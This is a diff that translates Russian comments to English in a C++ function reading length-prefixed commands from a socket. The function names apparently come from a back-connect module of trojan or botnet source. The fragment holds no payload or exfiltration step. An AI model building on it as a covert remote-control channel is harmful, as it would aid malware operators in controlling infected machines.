@@ -16,10 +16,10 @@ bool Backconnect::_readCommand(SOCKET s, COMMAND *command, LPBYTE *data)
 {
   WORD size[2];
   
-  //Получаем основные данные.
+  //Obtain the basic data.
   if(!WSocket::tcpRecvAll(s, size, sizeof(WORD) * 2, SOCKET_TIMEOUT) || size[0] <= sizeof(WORD) * 2)return false;
 
-  //Получаем следующие данные структуры.
+  //We obtain the following data structure.
   LPBYTE buffer = (LPBYTE)Mem::alloc(size[0]);
   if(buffer == NULL)
   {
@@ -33,14 +33,14 @@ bool Backconnect::_readCommand(SOCKET s, COMMAND *command, LPBYTE *data)
     return false;
   }
     
-  //Заполняем структуру.
+  //Fill in the structure.
   command->structSize = sizeof(COMMAND);
   command->dataSize   = size[1];
   command->command    = buffer[0];
     
   Mem::free(buffer);
 
-  //Получаем данные.
+  //Obtain the data.
   if(size[1] == 0)
   {
     if(data)*data = NULL;
@@ -59,7 +59,7 @@ bool Backconnect::_readCommand(SOCKET s, COMMAND *command, LPBYTE *data)
       return false;
     }
     
-    //buffer[command->dataSize] = 0;/*safe byte*/
+    //buffer [command-> dataSize] = 0; / * safe byte * /
     *data = buffer;
   }
 
